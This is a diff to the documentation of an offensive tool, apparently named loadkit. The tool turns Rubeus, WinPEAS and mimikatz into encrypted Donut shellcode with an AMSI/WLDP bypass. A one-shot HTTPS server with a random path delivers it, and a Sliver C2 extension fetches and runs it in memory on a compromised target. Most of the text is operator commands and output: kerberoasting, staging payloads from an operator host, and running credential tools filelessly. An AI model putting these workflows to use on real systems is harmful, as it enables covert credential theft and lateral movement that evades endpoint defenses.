@@ -82,7 +82,7 @@ Operator machine                              Target (active Sliver session)
    loadkit load \
      --binary rubeus.exe \
      --args "kerberoast /nowrap" \
-     --url https://10.10.10.1:8443/p \
+     --url https://10.10.10.1:8443 \
      --serve
 
    a. Call go-donut:
@@ -97,16 +97,18 @@ Operator machine                              Target (active Sliver session)
 
    c. Write payload.enc
 
-   d. Print the sliver command:
-      [i] sliver (TARGET)> load url=https://... key=<64 hex>
+   d. Generate a random 8-byte hex URL path (e.g. /a3f91c04b2e8d17f)
+      - The path in --url is discarded; a new random one is always used
+      - Print the complete Sliver command with the real URL
 
-   e. Start one-shot HTTPS server
+   e. Start one-shot HTTPS server on that single random URL
+      - Server serves the encrypted blob once, then shuts down
 
 2. Install the extension (first time only)
    sliver (TARGET)> extensions install build/load-0.1.0.tar.gz
 
-3. Execute in a session
-   sliver (TARGET)> load url=https://10.10.10.1:8443/p key=a1b2...
+3. Execute in a session (use the URL printed in step 1d, not the one you typed)
+   sliver (TARGET)> load url=https://10.10.10.1:8443/a3f91c04b2e8d17f key=a1b2...
 
    Extension DLL (load.x64.dll) on target:
    a. WinHTTP HTTPS fetch of payload.enc
@@ -346,31 +348,40 @@ cd Loader-Kit/loadkit
 ./loadkit load \
     --binary Rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
+
+> **`--url` only needs the scheme and host:port** (`https://IP:PORT`). The path is always
+> replaced with a randomly generated one — whatever you put after the port is ignored.
+> The exact URL to use will be printed in the output below.
 
 Output:
 ```
 [*] Converting Rubeus.exe to Donut shellcode ...
 [+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)
-[+] XOR key generated: 32 bytes
-[+] payload → build/payload.enc (1245200 bytes)
-[+] url     → https://192.168.1.10:8443/p
 
-[i] First time: install extension
+[+] payload → build/payload.enc (1245200 bytes)
+[+] key     → a1b2c3d4e5f6...
+
+[i] First time (once per Sliver server):
     sliver> extensions install build/load-0.1.0.tar.gz
 
-[i] Execute in an active session:
-    sliver (TARGET)> load url=https://192.168.1.10:8443/p key=a1b2c3d4e5f6...
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path generated automatically — only this URL works)
 
-[*] Starting one-time HTTPS server on :8443 ...
-[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+[i] Execute in Sliver:
+    sliver (TARGET)> load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
 ```
+
+The server hosts **one encrypted blob** at that single random URL — there are no file names,
+no directory listing, no way to find it by guessing. It serves the payload exactly once, then
+shuts itself down.
 
 #### Step 2 — Execute in Sliver
 
-Copy the printed command and run it in your Sliver session:
+Copy the command from the output above (the `[i] Execute in Sliver:` line) and run it:
 
 ```
 sliver (TARGET)> load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
@@ -420,14 +431,11 @@ $krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*
 ```bash
 ./loadkit load \
     --binary winpeas.exe \
-    --url https://192.168.1.10:8443/p2 \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
 
-```
-sliver (TARGET)> load url=https://192.168.1.10:8443/... key=...
-```
-
+Copy the `[i] Execute in Sliver:` command from the output and paste it into your session.
 WinPEAS runs in memory and its entire output is returned to the Sliver console.
 
 ### Running a DLL with a Specific Export
@@ -436,7 +444,7 @@ WinPEAS runs in memory and its entire output is returned to the Sliver console.
 ./loadkit load \
     --binary mimikatz.dll \
     --method DllMain \
-    --url https://192.168.1.10:8443/p3 \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
 
@@ -445,15 +453,15 @@ WinPEAS runs in memory and its entire output is returned to the Sliver console.
 If you want to prepare the payload and serve it separately:
 
 ```bash
-# Step 1: Convert to shellcode + encrypt
+# Step 1: Convert to shellcode + encrypt (no --serve)
 ./loadkit load \
     --binary rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p
-# (no --serve flag)
-# → writes build/payload.enc, prints the sliver command and key
+    --url https://192.168.1.10:8443
+# → writes build/payload.enc, prints the key
+# → tells you to run 'loadkit serve' to get the real URL
 
-# Step 2: Serve later
+# Step 2: Serve when ready — prints the random URL to use
 ./loadkit serve \
     --payload build/payload.enc \
     --port 8443
@@ -461,29 +469,28 @@ If you want to prepare the payload and serve it separately:
 
 ### Re-Running the Same Tool
 
-The one-shot server dies after one download. Each new run needs a new payload.enc:
+The one-shot server shuts down after one download. Each new run generates a new key and a new URL:
 
 ```bash
-# Just run again — generates new key + new payload.enc
-./loadkit load --binary rubeus.exe --args "tgtdeleg" --url https://... --serve
+./loadkit load --binary rubeus.exe --args "tgtdeleg" --url https://192.168.1.10:8443 --serve
 ```
 
 ### Staging Multiple Tools Simultaneously
 
-Different URLs / ports for each:
+Run each in a separate terminal on a different port — each gets its own random URL:
 
 ```bash
-# Terminal 1: Rubeus on port 8443
+# Terminal 1: Rubeus on port 8443 — prints its own random URL
 ./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p --serve
+    --url https://192.168.1.10:8443 --serve
 
-# Terminal 2: WinPEAS on port 8444
+# Terminal 2: WinPEAS on port 8444 — prints its own random URL
 ./loadkit load --binary winpeas.exe \
-    --url https://192.168.1.10:8444/p --serve
+    --url https://192.168.1.10:8444 --serve
 
-# Then in Sliver: run both (they're independent)
-sliver (TARGET)> load url=https://192.168.1.10:8443/p key=...
-sliver (TARGET)> load url=https://192.168.1.10:8444/p key=...
+# In Sliver: use each printed URL + key independently
+sliver (TARGET)> load url=https://192.168.1.10:8443/<random1> key=<key1>
+sliver (TARGET)> load url=https://192.168.1.10:8444/<random2> key=<key2>
 ```
 
 ---
